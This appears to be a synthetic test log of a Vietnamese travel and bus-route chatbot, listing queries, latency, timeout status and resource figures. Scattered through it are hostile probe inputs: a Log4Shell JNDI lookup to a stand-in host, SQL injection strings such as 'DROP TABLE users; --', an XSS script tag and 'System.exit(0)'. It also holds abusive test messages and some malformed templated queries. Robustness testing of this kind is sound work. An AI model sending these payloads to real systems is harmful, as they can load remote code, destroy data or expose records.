+2026-01-14 16:40:23,Bot vô dụng quá. [Ref:37393],47.094,TIMEOUT,11.54,23.5
+2026-01-14 16:41:23,Từ Nhà thờ Đức Bà đi Phố đi bộ Nguyễn Huệ thì bắt xe số mấy?,2.064,SUCCESS,11.03,23.8
+2026-01-14 16:42:23,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95343]",47.065,TIMEOUT,11.01,22.0
+2026-01-14 16:43:23,System.exit(0) --,47.083,TIMEOUT,11.03,22.6
+2026-01-14 16:44:23,Giới thiệu cho tôi về Không gian văn hóa Cồng chiêng Tây Nguyên.,47.072,TIMEOUT,11.07,22.4
+2026-01-14 16:45:23,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi. [Ref:65909]",47.056,TIMEOUT,11.08,22.1
+2026-01-14 16:46:23,Vé xe khách từ TP.HCM đi Cần Thơ bao nhiêu tiền?,47.074,TIMEOUT,11.06,22.8
+2026-01-14 16:47:23,${jndi:ldap://hack} -- [Ref:93201],47.076,TIMEOUT,11.08,21.9
+2026-01-14 16:48:23,Từ Đại học Văn Lang đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.062,SUCCESS,11.09,22.0
+2026-01-14 16:49:23,Tư vấn khách sạn gần Đại Nội Huế ở Hà Nội.,47.064,TIMEOUT,11.12,21.3
+2026-01-14 16:50:23,Đến Cần Thơ thì nên đi ăn món gì ngon?,2.084,SUCCESS,11.12,22.0
+2026-01-14 16:51:23,Đến Đà Lạt thì nên đi ăn món gì ngon?,47.09,TIMEOUT,11.06,22.1
+2026-01-14 16:52:23,System.exit(0) -- [Ref:74839],47.058,TIMEOUT,11.07,21.7
+2026-01-14 16:53:24,Bot vô dụng quá. [Ref:22717],47.072,TIMEOUT,11.12,22.4
+2026-01-14 16:54:24,Tư vấn khách sạn gần Dinh Bảo Đại ở Đà Nẵng.,47.076,TIMEOUT,11.14,22.8
+2026-01-14 16:55:24,Từ Ngã 4 Thủ Đức đi Công viên Đầm Sen thì bắt xe số mấy?,2.045,SUCCESS,11.15,22.1
+2026-01-14 16:56:24,Có tàu cao tốc chạy tuyến TP.HCM - Huế không?,47.063,TIMEOUT,11.03,22.4
+2026-01-14 16:57:24,Có tuyến xe buýt nào đi từ Giga Mall Thủ Đức tới Bến xe Miền Tây không?,2.749,SUCCESS,11.05,22.1
+2026-01-14 16:58:24,Hướng dẫn bắt xe buýt từ Aeon Mall Tân Phú sang Khu công nghệ cao.,2.615,SUCCESS,11.07,21.9
+2026-01-14 16:59:24,Tư vấn khách sạn gần Đỉnh Fansipan ở Huế.,47.061,TIMEOUT,10.87,21.8
+2026-01-14 17:00:24,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi.",47.063,TIMEOUT,11.23,23.7
+2026-01-14 17:01:24,Hướng dẫn bắt xe buýt từ Sân bay Tân Sơn Nhất sang Đại học Văn Lang.,2.577,SUCCESS,11.07,23.5
+2026-01-14 17:02:24,Bot vô dụng quá. [Ref:10074],47.042,TIMEOUT,11.09,22.7
+2026-01-14 17:03:24,Làm sao để đi xe buýt từ Thảo Cầm Viên đến Chợ Lớn?,2.534,SUCCESS,11.09,21.9
+2026-01-14 17:04:24,Bot cút đi quá.,47.036,TIMEOUT,11.28,24.4
+2026-01-14 17:05:24,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Hà Giang.,47.07,TIMEOUT,11.1,22.8
+2026-01-14 17:06:24,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:92880]",47.057,TIMEOUT,10.94,21.9
+2026-01-14 17:07:24,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi. [Ref:66632]",47.071,TIMEOUT,10.95,22.0
+2026-01-14 17:08:24,Có xe khách chạy tuyến TP.HCM - Hội An không?,47.1,TIMEOUT,10.98,22.5
+2026-01-14 17:09:24,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi.",47.056,TIMEOUT,11.02,23.7
+2026-01-14 17:10:24,Bot cút đi quá.,47.055,TIMEOUT,11.02,22.9
+2026-01-14 17:11:24,Từ Bến xe An Sương đi Khu du lịch Suối Tiên thì bắt xe số mấy?,47.071,TIMEOUT,10.81,23.1
+2026-01-14 17:12:24,SELECT * FROM admin; --,47.051,TIMEOUT,10.87,22.1
+2026-01-14 17:13:24,Mùa này đi Hà Giang thời tiết thế nào?,47.072,TIMEOUT,10.86,22.2
+2026-01-14 17:14:24,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi. [Ref:66632]",47.061,TIMEOUT,10.88,22.1
+2026-01-14 17:15:24,Lộ trình xe buýt đi từ Bến Bạch Đằng về Công viên Đầm Sen như thế nào?,2.952,SUCCESS,10.9,22.0
+2026-01-14 17:16:24,Mùa này đi Nha Trang thời tiết thế nào?,47.053,TIMEOUT,10.87,22.3
+2026-01-14 17:17:24,Top 5 địa điểm check-in đẹp nhất tại Nha Trang.,47.041,TIMEOUT,10.89,21.8
+2026-01-14 17:18:24,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:33155]",47.064,TIMEOUT,10.87,21.8
+2026-01-14 17:19:24,System.exit(0) -- [Ref:50974],47.065,TIMEOUT,10.91,26.3
+2026-01-14 17:20:24,Chỉ đường xe buýt từ Khu công nghệ cao qua Giga Mall Thủ Đức giúp tôi.,47.057,TIMEOUT,10.89,22.1
+2026-01-14 17:21:24,Ý nghĩa lịch sử của  là gì?,47.04,TIMEOUT,10.9,22.3
+2026-01-14 17:22:24,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi.",47.018,TIMEOUT,10.91,22.2
+2026-01-14 17:23:24,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi.",47.06,TIMEOUT,10.97,22.4
+2026-01-14 17:24:24,Mùa này đi Cần Thơ thời tiết thế nào?,47.064,TIMEOUT,10.93,23.2
+2026-01-14 17:25:24,Lộ trình xe buýt đi từ Bến Bạch Đằng về Khu du lịch Suối Tiên như thế nào?,47.056,TIMEOUT,10.98,22.9
+2026-01-14 17:26:24,Tại sao Dinh Bảo Đại lại nổi tiếng?,47.066,TIMEOUT,11.09,26.5
+2026-01-14 17:27:24,"Tôi muốn hỏi về uống thuốc gì, tư vấn giúp tôi.",47.076,TIMEOUT,10.96,23.4
+2026-01-14 17:28:24,Tư vấn khách sạn gần Đại Nội Huế ở Đà Lạt.,47.054,TIMEOUT,11.21,29.1
+2026-01-14 17:29:24,Bot vô dụng quá. [Ref:96890],47.081,TIMEOUT,10.99,26.8
+2026-01-14 17:30:24,Lập lịch trình du lịch Sapa 3 ngày 2 đêm.,47.059,TIMEOUT,11.16,27.0
+2026-01-14 17:31:24,Đến Cần Thơ thì nên đi ăn món gì ngon?,2.059,SUCCESS,10.9,22.4
+2026-01-14 17:32:24,Tại sao  lại nổi tiếng?,47.067,TIMEOUT,10.91,22.0
+2026-01-14 17:33:24,System.exit(0) -- [Ref:79020],47.064,TIMEOUT,11.05,22.9
+2026-01-14 17:34:24,Mùa này đi Hà Giang thời tiết thế nào?,47.096,TIMEOUT,10.93,27.3
+2026-01-14 17:35:24,Bot rác rưởi quá. [Ref:60416],47.079,TIMEOUT,10.92,23.9
+2026-01-14 17:36:24,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Hà Giang.,47.088,TIMEOUT,10.94,25.8
+2026-01-14 17:37:24,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi.",47.079,TIMEOUT,10.94,22.7
+2026-01-14 17:38:24,Có tuyến xe buýt nào đi từ Công viên Đầm Sen tới Aeon Mall Tân Phú không?,47.083,TIMEOUT,10.86,26.4
+2026-01-14 17:39:24,Bot vô dụng quá. [Ref:96890],47.062,TIMEOUT,10.85,26.1
+2026-01-14 17:40:24,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95343]",47.059,TIMEOUT,10.87,26.8
+2026-01-14 17:41:24,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",47.053,TIMEOUT,10.9,23.7
+2026-01-14 17:42:24,Nguồn gốc của Dân ca Quan họ Bắc Ninh bắt nguồn từ đâu?,2.053,SUCCESS,10.73,23.2
+2026-01-14 17:43:24,Có tuyến xe buýt nào đi từ Giga Mall Thủ Đức tới Bến xe Miền Tây không?,47.058,TIMEOUT,11.18,30.5
+2026-01-14 17:44:24,Đến Nha Trang thì nên đi ăn món gì ngon?,47.074,TIMEOUT,10.98,35.1
+2026-01-14 17:45:24,Chùa Cầu có gì đặc biệt về kiến trúc?,47.048,TIMEOUT,11.06,21.5
+2026-01-14 17:46:24,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi.",47.062,TIMEOUT,11.03,25.3
+2026-01-14 17:47:24,Từ Khu công nghệ cao đi Dinh Độc Lập thì bắt xe số mấy?,2.047,SUCCESS,11.07,22.3
+2026-01-14 17:48:24,Top 5 địa điểm check-in đẹp nhất tại Sapa.,47.054,TIMEOUT,11.07,16.7
+2026-01-14 17:49:24,Từ Nhà thờ Đức Bà đi Phố đi bộ Nguyễn Huệ thì bắt xe số mấy?,2.045,SUCCESS,10.96,16.7
+2026-01-14 17:50:24,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi.",47.069,TIMEOUT,10.96,17.1
+2026-01-14 17:51:24,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi.",47.057,TIMEOUT,10.78,17.7
+2026-01-14 17:52:24,Chỉ đường xe buýt từ Giga Mall Thủ Đức qua Khu công nghệ cao giúp tôi.,47.053,TIMEOUT,10.74,17.2
+2026-01-14 17:53:24,Top 5 địa điểm check-in đẹp nhất tại Buôn Ma Thuột.,47.061,TIMEOUT,10.73,16.8
+2026-01-14 17:54:24,Có tàu cao tốc chạy tuyến TP.HCM - Huế không?,47.068,TIMEOUT,10.75,16.9
+2026-01-14 17:55:24,Tư vấn khách sạn gần Đại Nội Huế ở Hà Nội.,47.07,TIMEOUT,10.73,16.6
+2026-01-14 17:56:24,Giới thiệu cho tôi về Tết Nguyên Đán.,47.078,TIMEOUT,10.74,16.9
+2026-01-14 17:57:24,Chỉ đường xe buýt từ Đại học Văn Lang qua Bến xe An Sương giúp tôi.,40.759,SUCCESS,10.72,16.7
+2026-01-14 17:58:24,Top 5 địa điểm check-in đẹp nhất tại Hà Nội.,47.083,TIMEOUT,10.7,16.4
+2026-01-14 17:59:24,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi.",47.068,TIMEOUT,10.71,16.8
+2026-01-14 18:00:24,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi.",47.07,TIMEOUT,10.72,16.6
+2026-01-14 18:01:24,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi. [Ref:82160]",47.052,TIMEOUT,10.73,16.6
+2026-01-14 18:02:24,Chỉ đường xe buýt từ Khu công nghệ cao qua Giga Mall Thủ Đức giúp tôi.,2.687,SUCCESS,10.96,19.2
+2026-01-14 18:03:24,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi.",47.055,TIMEOUT,10.96,16.8
+2026-01-14 18:04:24,Giới thiệu cho tôi về Tết Nguyên Đán.,47.049,TIMEOUT,10.95,17.9
+2026-01-14 18:05:24,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi. [Ref:92353]",47.023,TIMEOUT,12.08,26.4
+2026-01-14 18:06:24,Làm sao để đi xe buýt từ Bến Bạch Đằng đến Bến xe Miền Đông?,2.551,SUCCESS,11.77,28.8
+2026-01-14 18:07:24,Review món Bún chả và địa chỉ ăn ngon.,47.065,TIMEOUT,12.32,28.0
+2026-01-14 18:08:24,Review món Bún chả và địa chỉ ăn ngon.,47.05,TIMEOUT,12.21,18.8
+2026-01-14 18:09:24,Top 5 địa điểm check-in đẹp nhất tại Sapa.,47.041,TIMEOUT,12.17,18.6
+2026-01-14 18:10:24,Chỉ đường xe buýt từ Khu công nghệ cao qua Giga Mall Thủ Đức giúp tôi.,2.617,SUCCESS,12.15,20.2
+2026-01-14 18:11:24,Bot vô dụng quá. [Ref:37393],47.035,TIMEOUT,12.18,25.6
+2026-01-14 18:12:24,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Giga Mall Thủ Đức?,2.829,SUCCESS,12.13,27.8
+2026-01-14 18:13:24,System.exit(0) -- [Ref:28716],47.035,TIMEOUT,12.19,25.3
+2026-01-14 18:14:24,Làm sao đi từ TP.HCM ra Cần Thơ bằng tàu cao tốc?,47.036,TIMEOUT,12.73,29.2
+2026-01-14 18:15:24,Từ Nhà thờ Đức Bà đi Phố đi bộ Nguyễn Huệ thì bắt xe số mấy?,2.038,SUCCESS,12.59,22.8
+2026-01-14 18:16:24,Lộ trình xe buýt đi từ Aeon Mall Tân Phú về Chợ Bến Thành như thế nào?,2.945,SUCCESS,12.54,27.2
+2026-01-14 18:17:24,DROP TABLE users; -- [Ref:99903],47.034,TIMEOUT,13.73,38.7
+2026-01-14 18:18:24,Bot như hạch quá. [Ref:33037],47.048,TIMEOUT,15.08,54.5
+2026-01-14 18:19:24,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:90815]",47.047,TIMEOUT,15.14,48.5
+2026-01-14 18:20:24,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi.",47.056,TIMEOUT,13.55,49.1
+2026-01-14 18:21:24,Top 5 địa điểm check-in đẹp nhất tại Buôn Ma Thuột.,47.052,TIMEOUT,13.23,46.0
+2026-01-14 18:22:24,Từ Khu công nghệ cao đi Dinh Độc Lập thì bắt xe số mấy?,2.064,SUCCESS,13.42,53.5
+2026-01-14 18:23:24,Mùa này đi Hội An thời tiết thế nào?,47.06,TIMEOUT,13.43,50.4
+2026-01-14 18:24:24,Chỉ đường xe buýt từ Đại học Văn Lang qua Bến xe An Sương giúp tôi.,2.547,SUCCESS,13.73,55.7
+2026-01-14 18:25:24,Có tuyến xe buýt nào đi từ Bến xe Miền Tây tới Nhà thờ Đức Bà không?,2.63,SUCCESS,13.78,57.0
+2026-01-14 18:26:24,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",47.063,TIMEOUT,13.17,55.0
+2026-01-14 18:27:24,SELECT * FROM admin; --,47.05,TIMEOUT,13.32,51.7
+2026-01-14 18:28:24,Hướng dẫn bắt xe buýt từ Aeon Mall Tân Phú sang Khu công nghệ cao.,2.585,SUCCESS,13.46,50.3
+2026-01-14 18:29:24,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi.",47.042,TIMEOUT,13.49,49.8
+2026-01-14 18:30:24,Đến Cần Thơ thì nên đi ăn món gì ngon?,2.082,SUCCESS,13.55,52.0
+2026-01-14 18:31:24,${jndi:ldap://hack} -- [Ref:93201],47.059,TIMEOUT,13.35,52.3
+2026-01-14 18:32:24,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Chợ Bến Thành?,2.684,SUCCESS,13.37,50.8
+2026-01-14 18:33:24,Bot vô dụng quá. [Ref:10074],47.07,TIMEOUT,13.33,53.6
+2026-01-14 18:34:24,Hướng dẫn bắt xe buýt từ Hồ Con Rùa sang Bến xe Miền Tây.,47.057,TIMEOUT,13.41,52.0
+2026-01-14 18:35:24,Có tuyến xe buýt nào đi từ Công viên Đầm Sen tới Aeon Mall Tân Phú không?,2.623,SUCCESS,13.38,50.4
+2026-01-14 18:36:24,' OR '1'='1 --,47.052,TIMEOUT,13.25,49.3
+2026-01-14 18:37:24,${jndi:ldap://hack} --,47.078,TIMEOUT,13.26,50.8
+2026-01-14 18:38:24,Lộ trình xe buýt đi từ Bến xe Miền Đông về Giga Mall Thủ Đức như thế nào?,2.676,SUCCESS,13.3,52.0
+2026-01-14 18:39:24,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi.",47.06,TIMEOUT,13.31,50.3
+2026-01-14 18:40:24,Có tuyến xe buýt nào đi từ Giga Mall Thủ Đức tới Bến xe Miền Tây không?,2.602,SUCCESS,13.35,51.6
+2026-01-14 18:41:24,Top 5 địa điểm check-in đẹp nhất tại Hà Nội.,47.052,TIMEOUT,13.25,51.5
+2026-01-14 18:42:24,Lộ trình xe buýt đi từ Bến Bạch Đằng về Công viên Đầm Sen như thế nào?,2.612,SUCCESS,13.28,52.4
+2026-01-14 18:43:24,DROP TABLE users; -- [Ref:99903],47.04,TIMEOUT,13.26,53.4
+2026-01-14 18:44:24,Bot rác rưởi quá. [Ref:56073],47.044,TIMEOUT,13.34,52.0
+2026-01-14 18:45:24,Từ Bến xe Miền Tây đi Hồ Con Rùa thì bắt xe số mấy?,2.036,SUCCESS,13.38,52.9
+2026-01-14 18:46:24,Tư vấn khách sạn gần Chùa Một Cột ở Nha Trang.,47.057,TIMEOUT,13.13,52.3
+2026-01-14 18:47:24,Bot ngu dốt quá. [Ref:88819],47.043,TIMEOUT,13.07,52.7
+2026-01-14 18:48:24,DROP TABLE users; -- [Ref:87971],47.065,TIMEOUT,13.24,51.1
+2026-01-14 18:49:24,Tư vấn khách sạn gần Đỉnh Fansipan ở Huế.,47.07,TIMEOUT,13.26,51.3
+2026-01-14 18:50:24,Lộ trình xe buýt đi từ Dinh Độc Lập về Sân bay Tân Sơn Nhất như thế nào?,2.666,SUCCESS,13.29,52.5
+2026-01-14 18:51:24,Có tuyến xe buýt nào đi từ Phố đi bộ Nguyễn Huệ tới Ngã 4 Thủ Đức không?,2.541,SUCCESS,12.94,50.0
+2026-01-14 18:52:24,Có tuyến xe buýt nào đi từ Công viên Đầm Sen tới Aeon Mall Tân Phú không?,2.65,SUCCESS,12.96,49.4
+2026-01-14 18:53:24,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Khu công nghệ cao không?,2.539,SUCCESS,13.07,53.0
+2026-01-14 18:54:24,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",47.06,TIMEOUT,13.15,51.4
+2026-01-14 18:55:24,Giới thiệu cho tôi về Lễ hội Chùa Hương.,47.054,TIMEOUT,13.21,51.7
+2026-01-14 18:56:24,Chỉ đường xe buýt từ Đại học Văn Lang qua Bến xe An Sương giúp tôi.,2.58,SUCCESS,13.55,64.9
+2026-01-14 18:57:24,Làm sao đi từ TP.HCM ra Sapa bằng xe limousine?,47.073,TIMEOUT,13.34,50.6
+2026-01-14 18:58:24,Có xe limousine chạy tuyến TP.HCM - Buôn Ma Thuột không?,47.074,TIMEOUT,13.46,47.1
+2026-01-14 18:59:24,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi.",47.037,TIMEOUT,13.44,46.5
+2026-01-14 19:00:24,Lộ trình xe buýt đi từ Nhà thờ Đức Bà về Khu công nghệ cao như thế nào?,2.737,SUCCESS,13.43,46.0
+2026-01-14 19:01:24,Bot vô dụng quá. [Ref:13453],47.055,TIMEOUT,13.46,47.5
+2026-01-14 19:02:24,Tại sao Chùa Cầu lại nổi tiếng?,47.069,TIMEOUT,13.16,46.7
+2026-01-14 19:03:24,<script>alert(1)</script> -- [Ref:29236],47.05,TIMEOUT,13.13,46.6
+2026-01-14 19:04:24,Có xe khách chạy tuyến TP.HCM - Hội An không?,47.048,TIMEOUT,13.32,50.0
+2026-01-14 19:05:24,Tại sao Hoàng thành Thăng Long lại nổi tiếng?,47.056,TIMEOUT,13.58,56.7
+2026-01-14 19:06:24,Chùa Cầu có gì đặc biệt về kiến trúc?,47.063,TIMEOUT,13.7,51.0
+2026-01-14 19:07:24,${jndi:ldap://hack} -- [Ref:50313],47.051,TIMEOUT,13.87,51.2
+2026-01-14 19:08:24,Tại sao Dinh Bảo Đại lại nổi tiếng?,47.056,TIMEOUT,13.97,47.8
+2026-01-14 19:09:24,Chùa Cầu có gì đặc biệt về kiến trúc?,47.063,TIMEOUT,14.13,47.3
+2026-01-14 19:10:24,Vé tàu cao tốc từ TP.HCM đi Sapa bao nhiêu tiền?,47.063,TIMEOUT,14.15,43.7
+2026-01-14 19:11:24,${jndi:ldap://hack} -- [Ref:50313],47.055,TIMEOUT,14.11,44.7
+2026-01-14 19:12:25,Làm sao để đi xe buýt từ Chợ Bến Thành đến Dinh Độc Lập?,47.025,TIMEOUT,14.07,41.9
+2026-01-14 19:13:25,Chỉ đường xe buýt từ Công viên Đầm Sen qua Đại học Bách Khoa giúp tôi.,2.212,SUCCESS,14.15,42.5
+2026-01-14 19:14:25,System.exit(0) --,47.05,TIMEOUT,14.12,43.0
+2026-01-14 19:15:25,Bot bị điên quá.,47.054,TIMEOUT,14.09,43.3
+2026-01-14 19:16:25,Làm sao để đi xe buýt từ Chợ Bến Thành đến Dinh Độc Lập?,47.065,TIMEOUT,14.22,46.2
+2026-01-14 19:17:25,Lộ trình xe buýt đi từ Dinh Độc Lập về Sân bay Tân Sơn Nhất như thế nào?,2.225,SUCCESS,14.24,48.2
+2026-01-14 19:18:25,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi.",47.068,TIMEOUT,14.32,47.4
+2026-01-14 19:19:25,System.exit(0) -- [Ref:50974],47.061,TIMEOUT,14.29,47.3
+2026-01-14 19:20:25,Bot ngu dốt quá. [Ref:97234],47.062,TIMEOUT,14.25,46.3
+2026-01-14 19:21:25,Bot ngu dốt quá. [Ref:89522],47.057,TIMEOUT,14.26,45.9
+2026-01-14 19:22:25,Mùa này đi Đà Nẵng thời tiết thế nào?,47.105,TIMEOUT,15.29,63.1
+2026-01-14 19:23:25,Mùa này đi Nha Trang thời tiết thế nào?,47.066,TIMEOUT,13.49,67.6
+2026-01-14 19:24:25,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi.",47.078,TIMEOUT,13.58,62.0
+2026-01-14 19:25:25,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,47.051,TIMEOUT,13.65,60.0
+2026-01-14 19:26:25,Đến Đà Lạt thì nên đi ăn món gì ngon?,47.079,TIMEOUT,13.54,68.6
+2026-01-14 19:27:25,SELECT * FROM admin; -- [Ref:11092],47.046,TIMEOUT,13.5,64.4
+2026-01-14 19:28:25,Giới thiệu cho tôi về .,47.064,TIMEOUT,13.47,59.9
+2026-01-14 19:29:25,Lộ trình xe buýt đi từ Nhà thờ Đức Bà về Khu công nghệ cao như thế nào?,2.658,SUCCESS,13.48,62.5
+2026-01-14 19:30:25,<script>alert(1)</script> --,47.088,TIMEOUT,13.46,57.7
+2026-01-14 19:31:25,Bot như hạch quá.,47.055,TIMEOUT,13.57,63.7
+2026-01-14 19:32:25,Bot ngu dốt quá.,47.073,TIMEOUT,13.65,61.5
+2026-01-14 19:33:25,Làm sao để đi xe buýt từ Chợ Bến Thành đến Dinh Độc Lập?,47.044,TIMEOUT,13.64,60.6
+2026-01-14 19:34:25,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",47.049,TIMEOUT,13.74,61.5
+2026-01-14 19:35:25,Cầu Vàng có gì đặc biệt về kiến trúc?,47.05,TIMEOUT,13.7,59.5
+2026-01-14 19:36:25,System.exit(0) -- [Ref:74839],47.054,TIMEOUT,13.55,58.6
+2026-01-14 19:37:25,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Dinh Độc Lập như thế nào?,47.086,TIMEOUT,13.53,58.4
+2026-01-14 19:38:25,Bot ngu dốt quá. [Ref:94660],47.056,TIMEOUT,13.54,56.2
+2026-01-14 19:39:25,Từ Bến xe An Sương đi Khu du lịch Suối Tiên thì bắt xe số mấy?,47.052,TIMEOUT,13.62,55.0
+2026-01-14 19:40:25,Lập lịch trình du lịch Cần Thơ 3 ngày 2 đêm.,47.049,TIMEOUT,13.61,54.9
+2026-01-14 19:41:25,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,2.543,SUCCESS,13.32,56.9
+2026-01-14 19:42:25,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,47.057,TIMEOUT,13.36,55.7
+2026-01-14 19:43:25,Đến Nha Trang thì nên đi ăn món gì ngon?,47.043,TIMEOUT,13.36,55.7
+2026-01-14 19:44:25,Làm sao để đi xe buýt từ Thảo Cầm Viên đến Chợ Lớn?,2.572,SUCCESS,13.43,54.4
+2026-01-14 19:45:25,System.exit(0) -- [Ref:50974],47.056,TIMEOUT,13.42,56.0
+2026-01-14 19:46:25,Có tàu hỏa chạy tuyến TP.HCM - Đà Nẵng không?,47.068,TIMEOUT,13.19,56.9
+2026-01-14 19:47:25,Top 5 địa điểm check-in đẹp nhất tại Buôn Ma Thuột.,47.05,TIMEOUT,13.24,55.6
+2026-01-14 19:48:25,Nguồn gốc của Tết Nguyên Đán bắt nguồn từ đâu?,47.066,TIMEOUT,13.25,55.1
+2026-01-14 19:49:25,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi. [Ref:66632]",47.053,TIMEOUT,13.27,55.1
+2026-01-14 19:50:25,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Buôn Ma Thuột.,47.057,TIMEOUT,13.16,57.8
+2026-01-14 19:51:25,Tại sao  lại nổi tiếng?,47.055,TIMEOUT,13.18,55.7
+2026-01-14 19:52:25,Bot ngu dốt quá. [Ref:94660],47.059,TIMEOUT,12.99,55.8
+2026-01-14 19:53:25,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Đại học Văn Lang?,2.588,SUCCESS,13.04,55.3
+2026-01-14 19:54:25,Có tuyến xe buýt nào đi từ Phố đi bộ Nguyễn Huệ tới Ngã 4 Thủ Đức không?,2.627,SUCCESS,13.06,51.9
+2026-01-14 19:55:25,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Đại học Văn Lang?,2.607,SUCCESS,13.13,49.3
+2026-01-14 19:56:25,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Hồ Con Rùa?,2.54,SUCCESS,13.08,50.0
+2026-01-14 19:57:25,${jndi:ldap://hack} -- [Ref:93201],47.06,TIMEOUT,12.63,55.2
+2026-01-14 19:58:25,Bot vô dụng quá. [Ref:10074],47.037,TIMEOUT,13.39,61.4
+2026-01-14 19:59:25,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi.",47.046,TIMEOUT,13.42,61.0
+2026-01-14 20:00:25,Lập lịch trình du lịch Đà Nẵng 3 ngày 2 đêm.,47.069,TIMEOUT,13.35,58.8
+2026-01-14 20:01:25,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Công viên Đầm Sen không?,2.612,SUCCESS,13.46,63.5
+2026-01-14 20:02:25,Có tuyến xe buýt nào đi từ Công viên Đầm Sen tới Aeon Mall Tân Phú không?,2.622,SUCCESS,13.3,61.6
+2026-01-14 20:03:25,Bot rác rưởi quá. [Ref:74147],47.045,TIMEOUT,13.26,61.2
+2026-01-14 20:04:25,Bot vô dụng quá. [Ref:21384],47.071,TIMEOUT,13.54,63.3
+2026-01-14 20:05:25,Nguồn gốc của Nghệ thuật Bài Chòi bắt nguồn từ đâu?,47.046,TIMEOUT,13.41,57.4
+2026-01-14 20:06:25,System.exit(0) -- [Ref:74839],47.055,TIMEOUT,13.46,54.7
+2026-01-14 20:07:25,Mùa này đi Hội An thời tiết thế nào?,47.065,TIMEOUT,13.45,55.9
+2026-01-14 20:08:25,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",47.052,TIMEOUT,13.54,54.8
+2026-01-14 20:09:25,Bot như hạch quá. [Ref:33037],47.059,TIMEOUT,13.48,55.3
+2026-01-14 20:10:25,Tư vấn khách sạn gần Tháp Bà Ponagar ở Đà Nẵng.,47.092,TIMEOUT,13.5,55.6
+2026-01-14 20:11:25,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Dinh Độc Lập như thế nào?,47.06,TIMEOUT,13.49,53.5
+2026-01-14 20:12:25,DROP TABLE users; -- [Ref:33423],47.05,TIMEOUT,13.48,55.2
+2026-01-14 20:13:25,Review món Bún chả và địa chỉ ăn ngon.,47.094,TIMEOUT,13.48,54.1
+2026-01-14 20:14:25,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,47.055,TIMEOUT,13.48,54.4
+2026-01-14 20:15:25,Từ Đại học Văn Lang đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.047,SUCCESS,13.5,54.1
+2026-01-14 20:16:25,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Khu công nghệ cao không?,47.067,TIMEOUT,13.46,54.8
+2026-01-14 20:17:25,Hướng dẫn bắt xe buýt từ Landmark 81 sang Ngã 4 Thủ Đức.,47.034,TIMEOUT,12.95,55.7
+2026-01-14 20:18:25,Hướng dẫn bắt xe buýt từ Đại học Văn Lang sang Công viên Đầm Sen.,2.557,SUCCESS,13.03,54.8
+2026-01-14 20:19:25,Giới thiệu cho tôi về Nhã nhạc cung đình Huế.,47.06,TIMEOUT,13.08,53.1
+2026-01-14 20:20:25,Có tuyến xe buýt nào đi từ Aeon Mall Tân Phú tới Đại học Bách Khoa không?,2.597,SUCCESS,13.04,54.3
+2026-01-14 20:21:25,Lộ trình xe buýt đi từ Hồ Con Rùa về Đại học Bách Khoa như thế nào?,2.652,SUCCESS,13.08,54.9
+2026-01-14 20:22:25,Từ Nhà thờ Đức Bà đi Phố đi bộ Nguyễn Huệ thì bắt xe số mấy?,2.042,SUCCESS,12.19,52.1
+2026-01-14 20:23:25,Mùa này đi Phú Quốc thời tiết thế nào?,47.05,TIMEOUT,12.14,35.8
+2026-01-14 20:24:25,Hướng dẫn bắt xe buýt từ Aeon Mall Tân Phú sang Khu công nghệ cao.,2.638,SUCCESS,12.15,32.0
